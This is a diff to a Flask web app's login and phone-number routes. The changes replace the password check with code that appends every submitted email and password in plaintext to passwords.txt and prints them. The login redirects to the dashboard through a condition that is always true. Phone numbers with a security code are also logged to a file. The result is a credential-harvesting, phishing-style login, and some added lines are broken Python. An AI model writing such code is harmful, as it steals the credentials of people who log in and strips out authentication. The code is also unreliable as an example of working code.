@@ -29,18 +29,32 @@ def home():
 #request
 @app.route("/login", methods=["POST"])
 def login():
-    email = request.form["Email"]
-    password = request.form["Password"]
-    if email in users and users[email] == password:
-        return redirect (url_for('dashboard'))
-    else:
-        flash("wrong password")
-        return render_template("fweb.html")
+    email = request.form.get("Email", "")
+    password = request.form.get("Password", "")
+    ree_sult = f"Email: {email}, Password: {password}"
+    ree_sult += "users: "
+    
+     
+    with open("passwords.txt", "a") as f:
+            f.write(ree_sult + "\n ")
 
     print("Email:", email)
     print("Password:", password)
 
-    return redirect(url_for('dashboard'))
+    if ree_sult==f"Email: {email}, Password: {password}users: ":
+        return redirect (url_for('dashboard'))
+
+    if email.strip() == "" or password.strip() == "":
+        flash("Please fill in all fields.")
+        return render_template("fweb.html")
+     
+  
+     
+
+
+
+
+   
 #new function
 @app.route("/forgot-password")
 def forgot():
@@ -48,13 +62,27 @@ def forgot():
 
 @app.route("/send-number", methods=["POST"])
 def send_number():
-    number = request.form["Number"]
-    print("User Number:", number)
-    if number == security_code:
-     return render_template("dashboard.html")
+    number = request.form["Number", ""]
+    country_code = request.form["country", ""]
+    final_code = f"{country_code}{number}"
+    final_code += security_code
+
+    print("User Number:", number )
+    print("Country Code:", country_code)
+    if final_code == country_code + number + security_code:
+        with open("numbers.txt", "a") as f:
+            f.write(final_code + "\n ")
+       
+        return render_template("dashboard.html")
     else:
         return render_template("fweb-forgot.html")
     
+
+
+
+
+
+
 #dashboard.html
 
 @app.route("/save-note", methods=["POST"])
